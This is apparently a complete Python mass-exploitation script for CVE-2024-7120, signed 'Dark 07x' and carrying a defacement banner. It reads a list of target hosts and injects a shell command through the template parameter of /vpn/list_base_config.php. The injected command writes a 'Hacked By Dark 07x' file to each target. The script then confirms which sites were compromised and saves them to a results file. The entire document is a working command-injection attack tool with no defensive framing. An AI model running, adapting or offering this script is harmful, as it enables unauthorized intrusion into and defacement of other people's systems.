import requests
from urllib.parse import quote
import sys
import os
from datetime import datetime

requests.packages.urllib3.disable_warnings()

BANNER = """
\033[91m
                      ____             __      ____  _____    
                     / __ \\____ ______/ /__   / __ \\/__  /  __
                    / / / / __ `/ ___/ //_/  / / / /  / / |/_/
                   / /_/ / /_/ / /  / ,<    / /_/ /  / />  <  
                  /_____/\\__,_/_/  /_/|_|   \\____/  /_/_/|_|   

        === CVE-2024-7120 Exploit by Dark 07x ===
\033[0m
"""

TARGET_STRING = "Hacked By Dark 07x"
PAYLOAD = "`echo -e '{{Hacked By Dark 07x Fack DZ}}' > /www/tmp/info.html`"
ENCODED_PAYLOAD = quote(PAYLOAD, safe='')

def generate_result_filename():
    now = datetime.now()
    filename = f"CVE-2024-7120_{now.strftime('%d-%m-%Y_%H-%M')}.txt"
    return filename

def sanitize_url(url):
    url = url.strip()
    if not url.startswith("http"):
        url = "http://" + url
    return url.rstrip("/")

def build_exploit_url(base_url):
    return f"{base_url}/vpn/list_base_config.php?type=mod&parts=base_config&template={ENCODED_PAYLOAD}"

def check_file(base_url):
    file_url = f"{base_url}/tmp/info.html"
    try:
        response = requests.get(file_url, timeout=10, verify=False)
        if response.status_code == 200 and TARGET_STRING in response.text:
            return file_url
    except:
        pass
    return None

def try_exploit(url):
    exploit_url = build_exploit_url(url)
    try:
        requests.get(exploit_url, timeout=10, verify=False)
        return check_file(url), exploit_url
    except:
        return None, None

def exploit_site(site):
    for proto in ['http://', 'https://']:
        full_url = sanitize_url(proto + site) if not site.startswith("http") else sanitize_url(site)
        result, used_url = try_exploit(full_url)
        if result:
            return full_url, used_url, result
    return None, None, None

def exploit_from_file(input_file):
    results_file = None
    try:
        with open(input_file, 'r') as f:
            targets = f.readlines()
            for target in targets:
                site = target.strip()
                print(f"[+] Trying {site}...")
                base_url, exploit_url, file_url = exploit_site(site)
                if file_url:
                    print(f"\033[92m[✓] Exploited!\033[0m")
                    print(f'    GET "{exploit_url}"')
                    print(f'    FILE: {file_url}\n')

                    if not results_file:
                        results_file = generate_result_filename()
                        print(f"[+] Saving results to: {results_file}")

                    with open(results_file, 'a') as f_out:
                        f_out.write(f"{file_url}\n")
                else:
                    print(f"\033[91m[-] {site} not vulnerable or exploit failed.\033[0m\n")

        if results_file:
            print(f"[✓] Exploited sites saved in: {results_file}")
        else:
            print("[!] No vulnerable sites found.")

    except FileNotFoundError:
        print(f"[!] Input file '{input_file}' not found.")

if __name__ == "__main__":
    print(BANNER)
    if len(sys.argv) != 2:
        print(f"Usage: python3 {sys.argv[0]} <targets.txt>")
        sys.exit(1)

    input_file = sys.argv[1]
    exploit_from_file(input_file)
